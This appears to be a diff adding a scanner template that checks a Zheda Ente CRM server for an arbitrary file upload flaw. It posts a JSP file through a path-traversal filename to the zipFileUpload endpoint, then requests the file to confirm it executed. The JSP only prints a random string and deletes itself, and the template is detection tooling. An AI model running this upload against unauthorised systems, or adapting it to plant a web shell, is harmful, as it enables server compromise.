@@ -1,0 +1,53 @@
+id: poc-yaml-zhe-da-en-te-crmbasicaction-entcrm-anyfile-upload
+info:
+  name: 浙大恩特客户资源管理系统 CrmBasicAction.entcrm 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 两高一弱,文件上传
+
+variables:
+  filename: "{{rand_text_alphanumeric(6)}}"
+  content: "{{rand_text_alphanumeric(32)}}"
+  boundary: "{{rand_text_alphanumeric(20)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/entsoft/CrmBasicAction.entcrm?method=zipFileUpload&c_transModel=old"
+    headers:
+      Content-Type: "multipart/form-data; boundary={{boundary}}"
+    body: |
+      --{{boundary}}
+      Content-Disposition: form-data; name="file"; filename="../../{{filename}}.jsp"
+      Content-Type: application/zip
+
+      <% out.println("{{content}}");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+      --{{boundary}}--
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, 'status')"
+          - "contains(body, filename)"
+          - "regex(body, 'enterdoc.war\\/dao\\//.*?\\/\"')"
+    extractors:
+      - type: regex
+        name: t1
+        group: 1
+        regex:
+          - "enterdoc.war\\/dao\\//(?P<t1>.*?)\\/\""
+        internal: true
+
+  - id: file-check
+    method: GET
+    path:
+      - "{{BaseURL}}/enterdoc/dao/{{t1}}/{{filename}}.jsp"
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, content)"
